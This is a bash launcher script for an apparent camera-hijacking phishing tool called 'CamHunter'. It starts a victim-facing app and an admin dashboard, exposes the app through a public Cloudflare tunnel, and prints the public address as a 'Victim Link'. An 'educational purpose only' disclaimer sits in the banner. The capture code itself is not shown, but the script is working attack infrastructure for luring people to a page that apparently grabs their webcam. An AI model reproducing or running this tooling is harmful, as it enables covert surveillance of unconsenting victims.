#!/bin/bash

# ──[ CamHunter Banner and Disclaimer ]────────────────────
clear
echo -e "\e[1;31m"
echo "╔══════════════════════════════════════════════════╗"
echo "║             🚨 CamHunter is Running 🚨           ║"
echo "║    Author not responsible for any misuse. ⚠️     ║"
echo "║      For educational purpose only. 📚            ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "\e[0m"

# ──[ Trap Ctrl+C or terminal close ]─────────────────────
cleanup() {
    echo -e "\n\n\e[1;31m[!] Interrupted. Shutting down...\e[0m"
    pkill -f "python3 app.py"
    pkill -f "python3 admin_app.py"
    pkill -f "cloudflared"
    exit 0
}
trap cleanup SIGINT SIGTERM

# ──[ Start app.py ]──────────────────────────────────────
echo -e "\e[1;36m🚀 Starting app.py on port 5000...\e[0m"
python3 app.py > app.log 2>&1 &
sleep 2

# ──[ Start admin_app.py ]────────────────────────────────
echo -e "\e[1;34m🚀 Starting admin_app.py on port 5001...\e[0m"
python3 admin_app.py > admin.log 2>&1 &
sleep 2

# ──[ Verify admin_app.py is running ]────────────────────
if pgrep -f "admin_app.py" > /dev/null; then
    echo -e "\e[1;32m✅ Admin app started successfully on port 5001.\e[0m"
else
    echo -e "\e[1;31m❌ Failed to start admin_app.py. Check admin.log\e[0m"
fi

# ──[ Start Cloudflare Tunnel ]───────────────────────────
echo -e "\e[1;35m🔁 Launching Cloudflare tunnel...\e[0m"
cloudflared tunnel --url http://localhost:5000 > .cloudlog 2>&1 &
sleep 3

# ──[ Extract public URL from cloudflared log ]──────────
until grep -q "https://.*trycloudflare.com" .cloudlog; do
    sleep 1
done

victim_url=$(grep -o "https://[-a-zA-Z0-9.]*trycloudflare.com" .cloudlog | head -n1)

# ──[ Display All Links ]─────────────────────────────────
echo -e "\n\e[1;33m[📡 Victim Link] ➜ $victim_url\e[0m"
echo -e "\e[1;36m[🌐 Localhost Link (5000)] ➜ http://localhost:5000\e[0m"
echo -e "\e[1;34m[🔒 Admin Dashboard (5001)] ➜ http://localhost:5001\e[0m"

echo -e "\n\e[1;31m[!] If you close this terminal or press Ctrl+C, everything will stop.\e[0m"

# ──[ Keep Alive ]────────────────────────────────────────
while true; do sleep 1; done
